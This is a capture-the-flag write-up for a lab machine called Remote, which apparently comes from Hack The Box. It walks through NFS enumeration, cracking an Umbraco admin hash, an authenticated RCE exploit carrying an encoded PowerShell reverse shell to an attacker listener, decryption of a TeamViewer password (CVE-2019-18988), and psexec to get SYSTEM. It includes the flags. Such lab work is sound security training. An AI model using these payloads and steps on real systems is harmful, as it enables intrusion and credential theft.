## Remote 

### Lab Details 

- Difficulty: Easy
- Type: Umbraco CMS, NFS, TeamViewer,  Windows

#### Tasks
Q1: What service runs on port 2049?
- run nmap `nmap -sT -T4 -vv -A -p- -Pn -oA Remote 10.10.10.180`
- mountd
```
<snip>
111/tcp   open  rpcbind       syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
<snip>
```
Q2: Before we proceed enumerating other services, nmap reveals that anonymous login is allowed for FTP. How many files are available over anonymous FTP?
- no files are found in ftp
```
$ ftp anonymous@10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49728|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
```
Q3: On TCP port 80 we can see a web store. What is the name of the content management system (CMS) present on Remote?
- visit the application at `http://target_ip`

Q4: Since FTP yielded no results we shift our attention over to NFS shares. What is the name of the directory that is available on NFS? (Don't include a leading /)
- found a greate article on NFS and how to enumerate NFS https://notes.benheater.com/books/nmap/page/enumerating-nfs
- the directory that is available is site_backups

```
$ sudo nmap -p111 --script=nfs* 10.10.10.180
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-02 06:18 EDT
Nmap scan report for 10.10.10.180
Host is up (0.31s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /site_backups 
| nfs-statfs: 
|   Filesystem     1K-blocks   Used        Available   Use%  Maxfilesize  Maxlink
|_  /site_backups  24827900.0  11838800.0  12989100.0  48%   16.0T        1023
| nfs-ls: Volume /site_backups
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID         GID         SIZE   TIME                 FILENAME
| rwx------   4294967294  4294967294  4096   2020-02-23T18:35:48  .
| ??????????  ?           ?           ?      ?                    ..
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:39  App_Browsers
| rwx------   4294967294  4294967294  4096   2020-02-20T17:17:19  App_Data
| rwx------   4294967294  4294967294  4096   2020-02-20T17:16:40  App_Plugins
| rwx------   4294967294  4294967294  8192   2020-02-20T17:16:42  Config
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:40  aspnet_client
| rwx------   4294967294  4294967294  49152  2020-02-20T17:16:42  bin
| rwx------   4294967294  4294967294  64     2020-02-20T17:16:42  css
| rwx------   4294967294  4294967294  152    2018-11-01T17:06:44  default.aspx
|_

Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds
```
Q5: After mounting the "site_backups" share we realize that an "Umbraco" directory exists inside it. Local installation files sometimes include sensitive information like passwords, usernames, e-mails, etc. What is the name of the file that includes the password for the "admin" user?
- to mount the NFS, more detail refer to the guide above
```
#create a directory or use an existing directory to store the NFS
mkdir -p /tmp/10.129.77.115/share_name

#mount the NFS
sudo mount -o nolock 10.129.77.115:/share_name /tmp/10.129.77.115/share_name
```

- found forum on our.umbraco.com https://our.umbraco.com/forum/getting-started/installing-umbraco/35554-Where-does-Umbraco-store-usernames-and-passwords
- the file that contains admin login is Umbraco.sdf
```
$ cat Umbraco.sdf | grep -a admin 
��V�t�t�y���Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d��׃rf�u�rf�v�rf���rf����X�v�������adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}
<snip>
```
Q6: No clear-text passwords were available on that file. But, we managed to grab some password hashes. What is the clear text password of the "admin" user?
- crack it using https://crackstation.net/ and we get baconandcheese

Q7: What version of Umbraco is running on the remote machine?
- according to this forum post https://our.umbraco.com/forum/getting-started/installing-umbraco/15892-How-to-tell-which-version-of-Umbraco-an-installation-uses
- we can login to umbraco and find the verion in the question mark icon on the top right side of the page
- login is admin@htb.local / baconandcheese
- version is  7.12.4

Q8: Submit the flag located on the public user's desktop.
- get POC https://github.com/noraj/Umbraco-RCE and run the exploit.py
- we will need to generate a payload for a reverse shell, use https://www.revshells.com/
```
$ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA5ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```
- start a nc listener
```
$ nc -lnvp 9001                                      
listening on [any] 9001 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.180] 49740

PS C:\windows\system32\inetsrv> ls C:\Users\Public\Desktop


    Directory: C:\Users\Public\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/20/2020   2:14 AM           1191 TeamViewer 7.lnk                                                      
-ar---         6/2/2025   7:06 AM             34 user.txt                                                              


PS C:\windows\system32\inetsrv> cat C:\Users\Public\Desktop\user.txt
568f5a45b5ba152042fe572759bed103
```
Q9: After getting code execution on the system through a vulnerability in Umbraco, what non-default service is running on the system?
 - we can check the running services on the target 
```
PS C:\Users\Public\Downloads> Get-Service | Where-Object {$_.Status -eq 'Running'}

Status   Name               DisplayName                         
------   ----               -----------                           
<snip>
Running  TeamViewer7        TeamViewer 7                 
<snip>
```
Q10: Which 2019 CVE is related to this version of TeamViewer?
 - search for teamviewer 7 online will return a result https://github.com/mr-r3b00t/CVE-2019-18988
 - after examining the POC, its query for registry hive for any stored password
```
C:\Users\Public\Downloads>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v Version 

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    Version    REG_SZ    7.0.43148


C:\Users\Public\Downloads>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056957AA6
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x659d58d6
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\AccessControl
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\DefaultSettings
```
- we are interested in the `SecurityPasswordAES` field, we can try decrypt it use cyberchef as mentioned in the POC 
- load the recipe in cyberchef `https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'0602000000a400005253413100040000'%7D,%7B'option':'Hex','string':'0100010067244F436E6762F25EA8D704'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Decode_text('UTF-16LE%20(1200)')&input=RkY5QjFDNzNENjZCQ0UzMUFDNDEzRUFFMTMxQjQ2NEY1ODJGNkNFMkQxRTFGM0RBN0U4RDM3NkIyNjM5NEU1Qg`

Q10: Submit the flag located on the administrator's desktop.
 - check the password found to see if it grants access to administrator account 
 - we can use nxc to check 
```
$ nxc smb 10.10.10.180 -u administrator -p '!R3m0te!'
SMB         10.10.10.180    445    REMOTE           [*] Windows 10 / Server 2019 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
SMB         10.10.10.180    445    REMOTE           [+] remote\administrator:!R3m0te! (Pwn3d!)
```
- after confirming the password belongs to admin then we can use impacket-
psexec to gain a shell on the system
```
$ impacket-psexec Administrator:'!R3m0te!'@10.10.10.180 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.180.....
[*] Found writable share ADMIN$
[*] Uploading file ppkpHeXB.exe
[*] Opening SVCManager on 10.10.10.180.....
[*] Creating service sUXO on 10.10.10.180.....
[*] Starting service sUXO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt 
95e0296e28824035f6d4509fce8b2746
```


#### Resources
- Enumerate NFS - https://notes.benheater.com/books/nmap/page/enumerating-nfs
- Admin Crendetial - https://our.umbraco.com/forum/getting-started/installing-umbraco/35554-Where-does-Umbraco-store-usernames-and-passwords
- Crack SHA1 - https://crackstation.net/


#### Lesson Learned
